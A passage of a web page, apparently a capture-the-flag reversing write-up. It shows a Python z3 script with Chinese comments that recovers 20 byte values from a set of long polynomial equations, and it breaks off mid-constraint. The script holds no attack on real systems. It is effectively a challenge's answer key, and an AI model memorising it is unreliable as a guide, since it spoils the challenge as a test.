class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个求解器实例</span></span><br><span class="line">f = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个整数变量的数组，用于存储z3num中的值</span></span><br><span class="line">z3num = [Int(<span class="string">f&#x27;z3num[<span class="subst">&#123;i&#125;</span>]&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> z3num:</span><br><span class="line">    f.add(num &gt;= <span class="number">0</span>)</span><br><span class="line">    f.add(num &lt;= <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">2582239</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - (<span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">      + <span class="number">17</span> * z3num[<span class="number">16</span>]) == <span class="number">2602741</span>)</span><br><span class="line">f.add(<span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>] * <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>] * <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>] * <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == <span class="number">2668123</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + (<span class="number">13</span> * z3num[<span class="number">12</span>] + <span class="number">11</span> * z3num[<span class="number">10</span>] - <span class="number">12</span> * z3num[<span class="number">11</span>]) * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">2520193</span>)</span><br><span class="line">f.add(<span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     + <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>] * <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>] * <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     - <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     - <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == <span class="number">8904587</span>)</span><br><span class="line">f.add(<span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>] * <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * (<span class="number">13</span> * z3num[<span class="number">12</span>] + <span class="number">12</span> * z3num[<span class="number">11</span>] - <span class="number">14</span> * z3num[<span class="number">13</span>] - <span class="number">15</span> * z3num[<span class="number">14</span>])</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == <span class="number">1227620874</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>] * <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">1836606059</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">8720560</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span></span><br><span class="line">     * z3num[<span class="number">10</span>]</span><br><span class="line">     * (<span class="number">10</span> * z3num[<span class="number">9</span>] + <span class="number">30</span> * z3num[<span class="number">5</span>] + <span class="number">5</span> * z3num[<span class="number">4</span>] + <span class="number">4</span> * z3num[<span class="number">3</span>] - <span class="number">7</span> * z3num[<span class="number">6</span>] + <span class="number">8</span> * z3num[<span class="number">7</span>] - <span class="number">9</span> * z3num[<span class="number">8</span>])</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - (<span class="number">16</span> * z3num[<span class="number">15</span>] - <span class="number">17</span> * z3num[<span class="number">16</span>] - <span class="number">18</span> * z3num[<span class="number">17</span>]) * <span class="number">15</span> * z3num[<span class="number">14</span>] == <span class="number">11387045</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     - <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">7660269</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - (<span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">      - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">      - <span class="number">30</span> * z3num[<span class="number">5</span>])</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">2461883</span>)</span><br><span class="line">f.add(<span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     - <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>] * <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == -<span class="number">966296</span>)</span><br><span class="line">f.add(<span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + (<span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">      + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">      + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">      + <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">      + <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">      - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">      + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">      - <span class="number">9</span> * z3num[<span class="number">8</span>])</span><br><span class="line">     * <span class="number">2</span></span><br><span class="line">     * z3num[<span class="number">1</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>] == <span class="number">254500223</span>)</span><br><span class="line">f.add(<span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>] * <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == <span class="number">6022286</span>)</span><br><span class="line">f.add(<span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>] * <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     - <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == -<span class="number">636956022</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>] * <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>] * <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">10631829</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">15</span> * z3num[<span 